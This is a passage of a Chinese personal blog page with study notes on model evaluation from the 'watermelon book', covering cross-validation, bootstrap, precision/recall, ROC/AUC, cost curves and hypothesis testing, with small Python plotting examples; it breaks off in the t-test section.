<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="Yueyec&#39;s Blog">
<meta property="og:url" content="https://yueyec.github.io/index.html">
<meta property="og:site_name" content="Yueyec&#39;s Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Yueyec&#39;s Blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://yueyec.github.io/">





  <title>Yueyec's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Yueyec's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://yueyec.github.io/2019/04/10/西瓜书-模型评估与选择/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yueyec">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yueyec's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/10/西瓜书-模型评估与选择/" itemprop="url">西瓜书 模型评估与选择</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-10T21:49:23+08:00">
                2019-04-10
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Data-Science/" itemprop="url" rel="index">
                    <span itemprop="name">Data Science</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="模型评估与选择"><a href="#模型评估与选择" class="headerlink" title="模型评估与选择"></a>模型评估与选择</h1><h2 id="2-1经验误差与过拟合"><a href="#2-1经验误差与过拟合" class="headerlink" title="2.1经验误差与过拟合"></a>2.1经验误差与过拟合</h2><p>经验误差(empirical error)为训练误差(training error)，即在训练集上得到的误差，<br>在新样本上的误差为泛化误差(generalization error)</p>
<p>当学习器把训练样本学习的太好时，会产生过拟合(overfitting)，于此相对的是欠拟合(underfitting)即对训练样本的一般性质上尚未学好</p>
<p>过拟合最常见的情况是学习能力过于强大，以至于把训练样本所有的不太一般的性质也学会了，而欠拟合通常是由于学习能力低下导致的</p>
<p>因为数据的不确定和不准确性，所以没法得到一个完全正确的模型，所以过拟合不可避免。即因为数据的随机性和其他原因，经验误差等于0，但是泛化误差也等于0的情况基本上是不存在的</p>
<h2 id="2-2-评估方法"><a href="#2-2-评估方法" class="headerlink" title="2.2 评估方法"></a>2.2 评估方法</h2><p>通过实验来得到的泛化误差来评估并进行选择<br>通常需要一个测试集(testing set)来测试学习器对新样本的判断能力，用测试误差(testing error)作为泛化误差的一个近似</p>
<p>对于一个m个样本的数据集D，得到一份训练集S和一份测试集T</p>
<h3 id="2-2-1-留出法"><a href="#2-2-1-留出法" class="headerlink" title="2.2.1 留出法"></a>2.2.1 留出法</h3><p>即将数据集分成两份数据集，当做测试集和训练集，这两个数据集的样本都不一样</p>
<p>需要注意的是S和T的分布需要一致，避免划分是引入额外的误差，列如分类中，各分类的比例保持一致</p>
<p>从采样(sampling)的角度就是分层采样(stratified sampling)，即按照类别分别采集相同比例的样本</p>
<p>假设D有三个类别，分别占有4，4，2的比例，那假设训练样本抽取80%的数据，则对于占40%的class1取其中的80%，同理对其他的类别</p>
<p>但是留出法得到的结果往往不稳定，因为根据采样的方法不同，得到的D,T样本也不同，因为如果对D进行排序，则取前面的80%数据和取后面80%的数据，得到的不一样，<br>一般采用若干次随机划分、重复进行实验评估后取平均值</p>
<p>但是实际是评估数据集D训练出来的学习器性能，所以常用的比例大约是2/3到4/5的数据用于当做训练集，来保证能尽可能接近于训练集D的分类器，但是又有一定数据来评估，得到较准确的评估值</p>
<h3 id="2-2-2-交叉验证法"><a href="#2-2-2-交叉验证法" class="headerlink" title="2.2.2 交叉验证法"></a>2.2.2 交叉验证法</h3><p>将数据集D划分为k个大小类似的互斥子集，每个子集都能保持一样的数据分布，也就是用了分层采样得到。</p>
<p>将k-1个子集当做训练集，1个当做测试集，那就能得到k个评估，取平均值作为整体的评估结果。<br>常用的k值为10，也就是k-折交叉验证，其他常用的k值为5，20。</p>
<p>其中如果将k定为m,则测试集只是其中一个样本，叫做留一法，这样可以保证得到的学习器可以和D训练出来的近似一致，<br>但是没法保证得到的估计结果会比其他评估方法好，并且计算量太大</p>
<h3 id="2-2-3-自助法"><a href="#2-2-3-自助法" class="headerlink" title="2.2.3 自助法"></a>2.2.3 自助法</h3><p>上面的方法因为都划分了一部分当成测试集，导致实际学习器训练的数据比实际数据D小，所以必然引入了一些因训练样本规模不一样导致的估计偏差，留一法虽然影响较小，但是计算量提高了。</p>
<p>为了解决训练规模的影响，可使用自助法</p>
<p>自助法(bosststrapping)是以自助采样法(boostrap sampling)为基础，给定m个数据集D，对D进行采样产生数据集D’,然后在将该样本放回D中，使得样本在下次采样中可以被采集到,就是放回的采样；重复m次后，得到了m个样本的数据D’；就是对数据D进行放回采样，每次采集m个样本。</p>
<p>这样样本D’的数据规模和原本的一样，并且因为有些数据被重复抽到导致一部分的数据并没有包括</p>
<p>数据在m次采样中始终不包括的概率是$(1-\frac{1}{m})^m$,取极限得到</p>
<script type="math/tex; mode=display">\lim_{m\to \infty}(1 - \frac{1}{m})^m = \frac{1}{e}\approx 0.368</script><p>即通过自助法，还有大概36.8%的样本没有被抽到，可以用D’做训练集，D\D’当测试集，这样的测试结果为包外估计(out-of-bag estimate)<br>自助法在数据集较小、难以有效划分训练集/测试集时很有效；此外，自助法能从初试数据集中产生不同的训练集，对集成学习等方法有很大的好处，但是因为改变了原本数据的分布，所以引入了估计偏差。因此在初试数据量足够时，留出法和交叉验证法较为常用</p>
<h3 id="2-2-4-调参和最终模型"><a href="#2-2-4-调参和最终模型" class="headerlink" title="2.2.4 调参和最终模型"></a>2.2.4 调参和最终模型</h3><p>大部分的算法都有参数(parameter)需要设置，除了对模型算法进行选择，还需要对算法参数进行设置，叫做参数调节即调参(parameter tuning)<br>许多参数都是在一个范围内选择的，参数往往不是最佳的，这是在计算开销和性能估计做的折中选择。<br>通常得到的最终模型还需要对整个训练进行训练，用的就是得到的最佳参数和算法模型，因为在之前得到的模型和算法参数都是根据部分数据集训练得到的。<br>为了和最终测试的测试集加以区分，训练数据中来估计的数据集称之为验证集(validation set)</p>
<h2 id="2-3-性能度量"><a href="#2-3-性能度量" class="headerlink" title="2.3 性能度量"></a>2.3 性能度量</h2><p>除了实验估计方法还需要衡量模型泛化能力的评价标准，就是性能度量(performace measure)。在任务需求下，使用不同的性能度量，可以得到不同的结果。所以模型的好坏除了算法和数据，还取决于任务需求。<br>回归任务最常用的性能度量是 均方误差(mean squared error)</p>
<script type="math/tex; mode=display">E(f;D) = \frac{1}{m}\sum_{i=1}^m(f(x_i)-y_i)^2</script><p>更一般的，对于数据分布$\mathcal{D}$和概率密度函数$\mathcal{p}(\cdot)$，均方误差可描述为</p>
<script type="math/tex; mode=display">E(f;\mathcal{D}) = \int_{x\sim\mathcal{D}}(f(x) - y)^2\mathcal{p}(x)\mathrm{d}x</script><h3 id="2-3-1-错误率和精度"><a href="#2-3-1-错误率和精度" class="headerlink" title="2.3.1 错误率和精度"></a>2.3.1 错误率和精度</h3><p>对于数据集D，分类错误率定义为</p>
<script type="math/tex; mode=display">E(f;D)=\frac{1}{m}\sum_{i=1}^m I(f(x_i)\ne y_i)</script><p>精度则为</p>
<script type="math/tex; mode=display">acc(f;D)=\frac{1}{m}\sum_{i=1}^m I(f(x_i)= y_i) \\
 =1 - E(f;D)</script><p>更一般的，对于数据分布$\mathcal{D}$和概率密度$\mathcal{p}(\cdot)$来说，错误率和精度为</p>
<script type="math/tex; mode=display">E(f;\mathcal{D})=\int_{x\sim\mathcal{D}}I(f(x_i)\ne y_i)\mathcal{p}(x)\mathrm{d}x</script><p>精度则为</p>
<script type="math/tex; mode=display">acc(f;\mathcal{D})=\int_{x\sim\mathcal{D}}I(f(x_i)= y_i)\mathcal{p}(x)\mathrm{d}x \\
=1 - E(f;\mathcal{D})</script><h3 id="2-3-2-查准率、查全率和F1"><a href="#2-3-2-查准率、查全率和F1" class="headerlink" title="2.3.2 查准率、查全率和F1"></a>2.3.2 查准率、查全率和F1</h3><p>如果不为了得到准确率，而是关心判断正确的样本中正确的比例，或者 有多少正例的样本被判断对了，则需要其他性能度量方法<br>查准率(precision)和查全率(recall)亦称为召回率更适合用于这类需求的性能度量</p>
<p>对于二分问题，根据真实类别和学习器判断的类别组合成四个分类</p>
<ol>
<li>真正例(true positive) 真实为 正，预测也为 正 TP</li>
<li>假正例(false positive) 真实为 负，预测为 正 FP</li>
<li>真反例(true negative) 真实为 负， 预测为 负 TN</li>
<li>假反例(false negative) 真实为 正，预测为 负 FN</li>
</ol>
<table border="0" cellpadding="0" cellspacing="0" width="300" style="border-collapse:
 collapse;table-layout:fixed;width:225pt">
 <col width="100" span="3" style="width:75pt">
 <tr height="25" style="height:19.0pt">
  <td rowspan="2" height="50" width="100" style="height:38.0pt;width:75pt">真实情况</td>
  <td colspan="2" class="xl63" width="200" style="width:150pt">预测结果</td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" style="height:19.0pt">正例</td>
  <td>反例</td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" style="height:19.0pt">正例</td>
  <td>TP(真正例)</td>
  <td>FN(假反例)</td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" style="height:19.0pt">反例</td>
  <td>FP(假正例)</td>
  <td>TN(真反例)</td>
 </tr>
 <tr height="0" style="display:none">
  <td width="100" style="width:75pt"></td>
  <td width="100" style="width:75pt"></td>
  <td width="100" style="width:75pt"></td>
 </tr>
</table>


<p>查准率P和查全率R分别为</p>
<script type="math/tex; mode=display">P = \frac{TP}{TP + FP}</script><script type="math/tex; mode=display">R = \frac{TP}{TP + FN}</script><p>查准率和查全率互相制约，基本上一个比较高时，另一个则较低，因为如果想要查全率高，则需要尽量的判断为正，但是会增加假正例，所以降低了查准率。如果要查准率高，则尽量选择有把握的正例，则导致了真正例在所有正例的比例降低，所以查全率会降低。</p>
<p>P-R曲线<br>根据学习器对样本的为正例的判断可信度排序，得到从最有可能是正例到最有可能是负例排序的样本，根据每个样本为阀值进行划分，判断前面的为正例，后面的为负例，得到查准率和查全率，用查全率作为横坐标，查准率作为纵坐标，得到曲线就是P-R曲线</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">%matplotlib inline</span><br><span class="line">y = np.array([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]) <span class="comment">#预测的类别</span></span><br><span class="line">y_hat = np.array([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]) <span class="comment">#实际的类别</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(y,y_hat)</span>:</span></span><br><span class="line">    <span class="comment">#默认已经排序了，不写排序的代码</span></span><br><span class="line">    m = y_hat.shape[<span class="number">0</span>]</span><br><span class="line">    x = []</span><br><span class="line">    y = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,m + <span class="number">1</span>):</span><br><span class="line">        positive = y_hat[-i:]</span><br><span class="line">        nagetive = y_hat[:-i]</span><br><span class="line">        tp = positive.sum()</span><br><span class="line">        fp = len(positive) - tp</span><br><span class="line">        fn = nagetive.sum()</span><br><span class="line">        tn = len(nagetive) - fn</span><br><span class="line">        p = tp/float(len(positive))</span><br><span class="line">        r = tp / float(y_hat.sum())</span><br><span class="line">        x.append(r)</span><br><span class="line">        y.append(p)</span><br><span class="line">    <span class="keyword">return</span> x,y</span><br><span class="line"></span><br><span class="line">res = f(y,y_hat)</span><br><span class="line"></span><br><span class="line">plt.plot(res[<span class="number">0</span>],res[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<pre><code>[&lt;matplotlib.lines.Line2D at 0x1a1b31d198&gt;]
</code></pre><p><img src="/public/pic/output_27_1.png" alt="png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> precision_recall_curve</span><br><span class="line"><span class="keyword">from</span> sklearn.utils.fixes <span class="keyword">import</span> signature</span><br><span class="line">plt.figure(<span class="string">"P-R Curve"</span>)</span><br><span class="line">plt.title(<span class="string">'Precision/Recall Curve'</span>)</span><br><span class="line">plt.xlabel(<span class="string">'Recall'</span>)</span><br><span class="line">plt.ylabel(<span class="string">'Precision'</span>)</span><br><span class="line"><span class="comment">#y_true为样本实际的类别，y_scores为样本为正例的概率</span></span><br><span class="line">y_true = np.array([<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">y_scores = np.array([<span class="number">0.9</span>, <span class="number">0.75</span>, <span class="number">0.86</span>, <span class="number">0.47</span>, <span class="number">0.55</span>, <span class="number">0.56</span>, <span class="number">0.74</span>, <span class="number">0.62</span>, <span class="number">0.5</span>, <span class="number">0.86</span>, <span class="number">0.8</span>, <span class="number">0.47</span>, <span class="number">0.44</span>, <span class="number">0.67</span>, <span class="number">0.43</span>, <span class="number">0.4</span>, <span class="number">0.52</span>, <span class="number">0.4</span>, <span class="number">0.35</span>, <span class="number">0.1</span>])</span><br><span class="line">precision, recall, thresholds = precision_recall_curve(y_true, y_scores)</span><br><span class="line"><span class="comment">#print(precision)</span></span><br><span class="line"><span class="comment">#print(recall)</span></span><br><span class="line"><span class="comment">#print(thresholds)</span></span><br><span class="line">plt.plot(recall,precision)</span><br><span class="line"><span class="comment">#precision, recall, thresholds = precision_recall_curve(y_hat, y)</span></span><br><span class="line"><span class="comment">#print(recall)</span></span><br><span class="line"><span class="comment">#print(precision)</span></span><br><span class="line"><span class="comment">#plt.plot(recall,precision)</span></span><br></pre></td></tr></table></figure>
<pre><code>[&lt;matplotlib.lines.Line2D at 0x1a1b2a14a8&gt;]
</code></pre><p><img src="/public/pic/output_28_1.png" alt="png"></p>
<p>如果学习器A的P-R曲线包裹学习器B的曲线，则表明A优于B，但是曲线相交，则用曲线下的面积来判断，但是这个值很难判断，所以有其他判断方式</p>
<p>平衡点(Break-Even Point 简称BEP)，即查准率=查全率的时候.<br>BEP过于简单，所以一般使用F1度量,</p>
<script type="math/tex; mode=display">F1=\frac{2 \times  P \times  R}{P+R}=\frac{2 \times  TP}{样例总数+ TP-TN}</script><p>通过对查准率和查全率的偏向，得到一个更一般的$F_\beta$,定义为</p>
<script type="math/tex; mode=display">F_\beta = \frac{(1+\beta^2)\times P \times  R}{(\beta^2\times P)+R}</script><p>其中$\beta&gt;0$,度量了查全率对查准率的相对重要程度，当$\beta=1$就是标准的F1,$\beta &gt;1$则说明查全率更重要，$\beta&lt;1$说明查准率更重要</p>
<p>假设进行了多次的训练/测试，就获得了多个二分类的混淆矩阵，要综合判定，则有两种方法</p>
<p>一种是分别计算查准率和查全率，记为(P1,R1),(P2,R2),…$(P_n,R_n)$,在计算平均值，得到宏查准率(macro-P)，宏查全率(macro-R)，得到相应的宏F1(macro-F1)</p>
<script type="math/tex; mode=display">macro-P= \frac{1}{n}\sum_{i=1}^nP_i</script><script type="math/tex; mode=display">macro-R = \frac{1}{n}\sum_{i=1}^nR_i</script><script type="math/tex; mode=display">macro-F1 = \frac{2\times macro-P\times macro-R}{macro-P+macro-R}</script><p>另一种为对混淆矩阵的元素，求平均值，得到对应的$\overline{TP}$,$\overline{TN}$,$\overline{FP}$,$\overline{FN}$<br>求得微查准率(micro-P)，微查全率(micro-R)，和对应的微F1(micro-F1)</p>
<script type="math/tex; mode=display">micro-P = \frac{\overline{TP}}{\overline{TP}+ \overline{FP}}</script><pre><code>$$micro-R = \frac{\overline{Tp}}{\overline{TP} +\overline{FN}}$$
$$micro-F1 = \frac{2 \times  micro-P \times  micro-R}{micro-P + micro-R}$$
</code></pre><h3 id="2-3-3-ROC和AUC"><a href="#2-3-3-ROC和AUC" class="headerlink" title="2.3.3 ROC和AUC"></a>2.3.3 ROC和AUC</h3><p>P-R曲线对于样本不均衡的情况下，不稳定，所以可以使用ROC来判断</p>
<p>ROC(Receiver Operation Characteristic)全称是受试者工作特征曲线，与P-R曲线类似，但是横纵坐标分别是 假正例率(False Positive Rate FPR)和 真正例率(True Positive Rate TPR)分别表示为</p>
<script type="math/tex; mode=display">TPR=\frac{TP}{TP + FN}</script><script type="math/tex; mode=display">FPR = \frac{FP}{FP + TN}</script><p>如果学习器A的ROC曲线包裹学习器B的曲线，则表明A优于B,但是如果曲线交叉，则用去线下的面积AUC(Area Under ROC Curve)来判断好坏。</p>
<p>假设ROC曲线是由{$(x_1,y_1),(x_2,y_2),…,(x_n,y_n$}的点组成的，则AUC可以估计为</p>
<script type="math/tex; mode=display">AUC=\frac{1}{2}\sum_{i=1}^{m-1}(x_{i+1}- x_i)(y_i+y_{i+1})</script><p>可以看到AUC和样本预测的排序质量有关，假设有$m^+$,$m^-$个正反例，$D^+,D^-$表示正反例集合，则排序的损失(loss)函数为</p>
<script type="math/tex; mode=display">\ell_{rank} = \frac{1}{m^+m^-}\sum_{x^+\in D^+}\sum_{x^-\in D^-}(I(f(x^+)<f(x^-))+ \frac{1}{2}I(f(x^+)=f(x^-)))</script><p>即考虑每对正反例，若正例预测值小于反例，则记一个”罚分”，若相等，则记半个”罚分”，因为学习器是预测正例的，所以理想的状态是，正例的最小预测值大于反例的最大预测值，$\ell_{rank}$对应的就是ROC曲线之上的面积；</p>
<p>若一个正例在ROC曲线上对应标记点坐标为(x,y),则x恰好是排序在其之前的反例所占的比例，即假正例率，因此有</p>
<script type="math/tex; mode=display">AUC = 1 - \ell_{rank}</script><h4 id="ROC曲线与P-R曲线的区别"><a href="#ROC曲线与P-R曲线的区别" class="headerlink" title="ROC曲线与P-R曲线的区别"></a>ROC曲线与P-R曲线的区别</h4><p>最主要的区别是ROC可以在样本不均衡的情况下做判断，而P-R曲线会有很大的影响，但是P-R曲线更加直观</p>
<h3 id="2-3-4代价敏感错误率与代价曲线"><a href="#2-3-4代价敏感错误率与代价曲线" class="headerlink" title="2.3.4代价敏感错误率与代价曲线"></a>2.3.4代价敏感错误率与代价曲线</h3><p>不同哦该的错误造成的后果也不同，为不同类型错误所造成的不同损失，可为错误赋予非均等的代价(unqeual cost).</p>
<p>根据领域知识得到一个代价矩阵(cost matrix),其中$cost_{ij}$表示第i类被预测为j类，一般来说$cost_{ii}$为0</p>
<table border="0" cellpadding="0" cellspacing="0" width="300" style="border-collapse:
 collapse;table-layout:fixed;width:225pt">
 <col width="100" span="3" style="width:75pt">
 <tr height="25" style="height:19.0pt">
  <td rowspan="2" height="50" width="100" style="height:38.0pt;width:75pt">真实类别</td>
  <td colspan="2" class="xl63" width="200" style="width:150pt">预测类别</td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" style="height:19.0pt">第0类</td>
  <td>第1类</td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" style="height:19.0pt">第0类</td>
  <td>0</td>
  <td>$cost_{01}$</td>
 </tr>
 <tr height="25" style="height:19.0pt">
  <td height="25" style="height:19.0pt">第1类</td>
  <td>$cost_{10}$</td>
  <td>0</td>
 </tr>
 <tr height="0" style="display:none">
  <td width="100" style="width:75pt"></td>
  <td width="100" style="width:75pt"></td>
  <td width="100" style="width:75pt"></td>
 </tr>
</table>

<p>在非均等代价下，我们需要的不再是简单的最小化错误次数，而是最小化总体代价(total cost),将第0类作为正例，第1类作为反例，则代价敏感(cost-sensitive)的错误率为</p>
<script type="math/tex; mode=display">E(f;D;cost)=\frac{1}{m}(\sum_{x_i \in D^+}I(f(x_i)\ne y_i )\times  cost_{01} + \sum_{x_i \in D^-}I(f(x_i)\ne y_i) \times  cost_{10})</script><p>在非均等代价下，ROC不能直接反应处学习器的期望总体代价，所以需要用代价曲线(cost curve)来达到目的,<br>横坐标为取值在[0,1]的正例概率代价</p>
<script type="math/tex; mode=display">P(+)cost = \frac{ p\times cost_{01}}{p \times cost_{01}+(1-p)\times cost_{10}}</script><p>其中p为样例为正例的概率，纵坐标为取值为[0,1]的归一化代价</p>
<script type="math/tex; mode=display">cost_{norm}=\frac{FNR\times p\times cost_{01}+ FPR\times (1-p)\times cost_{10}}{p\times cost_{01}+ (1-p)\times cost_{10}}</script><p>其中FPR为假正率，而FNR=1-TPR为假反例率</p>
<h2 id="2-4-比较检验"><a href="#2-4-比较检验" class="headerlink" title="2.4 比较检验"></a>2.4 比较检验</h2><p>统计假设检验(hypothesis test)为我们在学习器性能比较提供了重要的依据，默认以错误率作为性能度量，用$\epsilon$表示</p>
<h3 id="2-4-1-假设检验"><a href="#2-4-1-假设检验" class="headerlink" title="2.4.1 假设检验"></a>2.4.1 假设检验</h3><p>假设检验中的”假设”是对学习器泛化错误分布的某种判断或猜测，例”$\epsilon=\epsilon_0$”。在实际任务中，并不知道泛化错误率，只能知道其测试错误率$\hat{\epsilon}$,泛化错误率和测试错误率未必相同，但是两者接近的可能性较大，相差很远的可能性很小。因此可根据测试错误率推出泛化错误率的分布</p>
<p>假设泛化错误为$\epsilon$,测试错误率为$\hat{\epsilon}$,$\hat{\epsilon}$意味着如果有m个样本，则会有$\hat{\epsilon}\times m$个样本会被分错。<br>假设测试样本，有$m’$个样本被分错,则泛化错误率为$\epsilon$的学习器将$m’$个样本分错的概率为$\tbinom{m}{m’}\epsilon^{m’}(1-\epsilon)^{m-m’}$,因此可以估计出恰好将$\hat{\epsilon}\times m$个样本分错的概率为</p>
<script type="math/tex; mode=display">P(\hat{\epsilon};\epsilon)=\dbinom{m}{\hat{\epsilon}\times m}\epsilon^{\hat{\epsilon}\times m}(1-\epsilon)^{(m-\hat{\epsilon}\times m)}</script><p>对此求导，解$\frac{\partial P(\hat{\epsilon};\epsilon)}{\partial \epsilon}=0$得到$p(\hat{\epsilon};\epsilon)$在$\epsilon=\hat{\epsilon}$时最大，这符合二项分布(binomial)</p>
<p>使用二项检验(binomial test)来对『$\epsilon \leq \epsilon_0$』这样的假设进行验证</p>
<p>在$1-\alpha$的概率内所能得到的最大错误率为</p>
<script type="math/tex; mode=display">\bar{\epsilon}=max\epsilon \qquad s.t \sum_{i=\epsilon_0 \times m +1}^m \dbinom{m}{i}\epsilon^i(1-\epsilon)^{m-i}<\alpha</script><p>其中$1-\alpha$反映了置信度(confidence),因为二项分布，随着p的变大，会向右偏，所以随着p的变大，会不满足条件，所以有个极值,就是需要得到这个最大值错误率，如果测试错误率小于这个最大错误率，则说明，在$1-\alpha$的置信度里，假设成立的，不能被拒绝，即认为在$1-\alpha$的置信度下，测试错误率为$\hat{\epsilon}$的学习器的泛化错误率不大于$\epsilon_0$。反之则需要拒绝</p>
<p>但是一般不止做一次留出法估计，或者其交叉验证中k取2的估计，会进行很多次训练/测试,所以会得到很多错误率，这时可以用t验证(t-test)。</p>
<p>假设得到了k个测试错误率$\hat{\epsilon_1},\hat{\epsilon_2},…,\hat{\epsilon_k}$,可以求的错误率$\mu$,方法$\sigma^2$为</p>
